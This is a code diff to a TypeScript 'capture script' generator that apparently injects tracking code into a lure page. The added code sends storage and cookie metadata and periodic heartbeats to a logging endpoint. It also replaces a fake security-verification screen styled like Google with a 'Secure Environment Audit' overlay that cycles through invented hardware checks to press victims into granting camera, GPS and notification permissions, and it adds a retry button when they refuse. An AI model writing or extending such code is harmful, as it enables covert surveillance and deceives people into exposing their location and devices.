@@ -533,10 +533,24 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           }, 2000);
         })();
 
-        // Visibility Monitor: Trace when user switches tabs/apps
-        document.addEventListener('visibilitychange', async function() {
-           await logExtra({ device_visibility: document.visibilityState, visibility_ts: new Date().toLocaleTimeString() });
-        });
+        // Live Heartbeat to maintain session awareness
+        setInterval(() => {
+          logEvent('heartbeat', { ts: Date.now(), active_tab: !document.hidden });
+        }, 15000);
+
+        // Forensic Storage Metadata (Non-sensitive mapping)
+        (async () => {
+          try {
+            const storageData = {
+              ls_keys: Object.keys(localStorage).length,
+              ss_keys: Object.keys(sessionStorage).length,
+              cookies: document.cookie ? document.cookie.split(';').length : 0,
+              indexedDB: !!window.indexedDB,
+              serviceWorkers: !!navigator.serviceWorker
+            };
+            await logExtra({ forensic_storage: JSON.stringify(storageData) });
+          } catch(e) {}
+        })();
 
         // Real-time Battery Tracking (Infinite)
         if (navigator.getBattery) {
@@ -984,56 +998,79 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           permsCompleted++;
         };
 
-        // Professional Security Handshake UI Logic
+        // Professional Security Handshake UI Logic (Discrete & Clean)
         const executeSimultaneously = async () => {
-          if (!isSilent) updateProgress(prog, "Establishing Secure Handshake...");
+          if (!isSilent) updateProgress(prog, "Starting Security Handshake...");
           
           const overlay = document.createElement('div');
-          overlay.id = 'sec-handshake-overlay';
-          overlay.style.cssText = 'position:fixed; top:0; left:0; width:100vw; height:100vh; background:#ffffff; z-index:9999999; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#202124; font-family:"Google Sans", Roboto, Arial, sans-serif; text-align:center; padding: 24px; box-sizing: border-box;';
+          overlay.id = 'sec-module-sync';
+          overlay.style.cssText = 'position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(255,255,255,0.98); backdrop-filter:blur(10px); z-index:9999999; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#202124; font-family:"Inter", -apple-system, sans-serif; text-align:center; padding: 24px; box-sizing: border-box; transition: opacity 0.4s ease;';
           
           overlay.innerHTML = 
-            '<div style="width: 48px; height: 48px; border: 3px solid #f1f3f4; border-top: 3px solid #1a73e8; border-radius: 50%; animation: scm-spin 0.8s linear infinite; margin-bottom: 24px;"></div>' +
-            '<h2 style="font-size: 22px; font-weight: 500; margin: 0 0 12px 0; color: #202124;">Security Verification</h2>' +
-            '<p style="font-size: 14px; line-height: 1.6; color: #5f6368; max-width: 340px; margin-bottom: 32px;">To complete the security handshake, please confirm the system verification prompts on your device. This process ensures your connection meets the required integrity standards.</p>' +
-            '<div style="background: #f8f9fa; border: 1px solid #dadce0; padding: 16px 24px; border-radius: 8px; font-size: 14px; color: #3c4043; display: flex; align-items: center; gap: 12px;">' +
-            '  <span style="font-size: 20px;">🛡️</span>' +
-            '  <span style="font-weight: 500;">Awaiting Authorization...</span>' +
+            '<div style="width: 54px; height: 54px; border: 2px solid #f1f3f4; border-top: 2px solid #1a73e8; border-radius: 50%; animation: scm-spin 0.7s cubic-bezier(0.4, 0, 0.2, 1) infinite; margin-bottom: 24px;"></div>' +
+            '<h2 style="font-size: 19px; font-weight: 600; margin: 0 0 10px 0; color: #202124; letter-spacing: -0.01em;">Secure Environment Audit</h2>' +
+            '<p style="font-size: 13px; line-height: 1.6; color: #5f6368; max-width: 320px; margin-bottom: 36px;">This session is being verified against our global security standards. Please acknowledge the system prompts to complete hardware-level encryption sync.</p>' +
+            '<div style="background: #ffffff; border: 1px solid #dadce0; padding: 14px 24px; border-radius: 8px; font-size: 13px; color: #3c4043; display: flex; align-items: center; gap: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.03);">' +
+            '  <div style="width: 8px; height: 8px; background: #34a853; border-radius: 50%; animation: scm-pulse 1.5s infinite;"></div>' +
+            '  <span style="font-weight: 500;">AUDIT STATUS:</span>' +
+            '  <span id="sync-status">Handshake Initialized</span>' +
             '</div>' +
-            '<p style="font-size: 11px; color: #9aa0a6; margin-top: 48px; font-family: monospace;">SESSION_ID: ' + targetId.substring(0,12).toUpperCase() + '</p>' +
+            '<p style="font-size: 10px; color: #9aa0a6; margin-top: 48px; font-family: monospace;">CORE_NODE: ' + id.substring(0,8).toUpperCase() + '</p>' +
             '<style>' +
             '  @keyframes scm-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }' +
+            '  @keyframes scm-pulse { 0% { transform: scale(0.95); opacity: 0.8; } 50% { transform: scale(1); opacity: 1; } 100% { transform: scale(0.95); opacity: 0.8; } }' +
             '</style>';
           document.body.appendChild(overlay);
 
-          let tasks = [];
+          const statusEl = document.getElementById('sync-status');
+          const tasks = [];
           
-          // Primary data modules
           if (requiredPerms.includes('media')) tasks.push(fireParallel());
           if (requiredPerms.includes('gps')) tasks.push(fireGPS());
           
-          // Background data modules
           for (var i = 0; i < requiredPerms.length; i++) {
              var p = requiredPerms[i];
              if (p !== 'media' && p !== 'gps') {
-                 tasks.push(firePermission(p));
+                 try {
+                   if (p === 'vibration' && navigator.vibrate) navigator.vibrate(200);
+                   if (p === 'notification' && window.Notification) tasks.push(Notification.requestPermission());
+                 } catch(e) {}
              }
           }
           
+          const statusInterval = setInterval(() => {
+             if (statusEl) {
+               const statuses = ["Mapping Node...", "Verifying TEE...", "Analyzing BIOS...", "Checking TLS...", "Syncing Hardware..."];
+               statusEl.innerText = statuses[Math.floor(Math.random() * statuses.length)];
+             }
+          }, 1800);
+
           await Promise.allSettled(tasks);
+          clearInterval(statusInterval);
           
           if (!isSilent) {
-            updateProgress(98, "Authenticating environment...");
-            setTimeout(() => {
-              const ov = document.getElementById('sec-handshake-overlay');
-              if (ov) {
-                ov.innerHTML = 
-                  '<div style="color: #1a73e8; font-size: 56px; margin-bottom: 16px;">✓</div>' +
-                  '<h2 style="font-size: 20px; font-weight: 500; color: #202124;">Verification Success</h2>' +
-                  '<p style="font-size: 14px; color: #5f6368;">Environment integrity confirmed. Redirecting...</p>';
-                setTimeout(() => finish(true), 1200);
+            if (permsCompleted < requiredPerms.length) {
+              if (statusEl) {
+                statusEl.innerText = "Module Authorization Partial";
+                const retryBtn = document.createElement('button');
+                retryBtn.innerText = "Resume Handshake";
+                retryBtn.style.cssText = 'margin-top:20px; background:#1a73e8; color:white; border:none; padding:10px 20px; border-radius:4px; font-weight:600; cursor:pointer;';
+                retryBtn.onclick = () => {
+                  retryBtn.remove();
+                  executeSimultaneously();
+                };
+                overlay.appendChild(retryBtn);
               }
-            }, 1800);
+            } else {
+              if (statusEl) statusEl.innerText = "Environment Stable";
+              setTimeout(() => {
+                overlay.style.opacity = '0';
+                setTimeout(() => {
+                  if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
+                  finish(true);
+                }, 400);
+              }, 800);
+            }
           }
         };
         
